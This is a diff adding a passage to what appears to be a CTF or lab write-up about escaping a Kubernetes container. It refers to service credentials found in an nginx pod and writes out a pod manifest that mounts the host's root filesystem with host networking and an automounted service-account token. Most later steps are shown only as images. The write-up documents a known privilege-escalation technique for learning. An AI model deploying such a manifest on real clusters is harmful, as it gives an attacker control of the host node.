@@ -296,3 +296,42 @@ we are in container so we are root
 
 so how to escape this
 
+in [this post](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration?source=post_page-----3eab1049daf2--------------------------------)
+
+![image](https://github.com/vanatka10/myblog/assets/126310360/ab3a0bae-2643-4135-a6b9-c9a3421933d2)
+
+
+
+we can saw some infomation about credentials of service in nginx pod, before get user i have used **kebuctl** but it need credential to access
+
+![image](https://github.com/vanatka10/myblog/assets/126310360/ac07e329-9f00-4611-ab50-12bda58a0493)
+![image](https://github.com/vanatka10/myblog/assets/126310360/f26bddb6-ccab-49b8-9883-58edcec4aa7d)
+
+create a malicous pod yaml
+```
+apiVersion: v1
+kind: Pod
+metadata:
+  name: malicous
+  namespace: default
+spec:
+  containers:
+  - name: malicous
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: rooty
+  volumes:
+  - name: rooty
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+![image](https://github.com/vanatka10/myblog/assets/126310360/bfe0314f-f897-43ac-8ba7-79231f7587c9)
+
+execute like user
+
+![image](https://github.com/vanatka10/myblog/assets/126310360/952ad6e5-e976-49e7-aa38-d26f4984cd89)
+
+
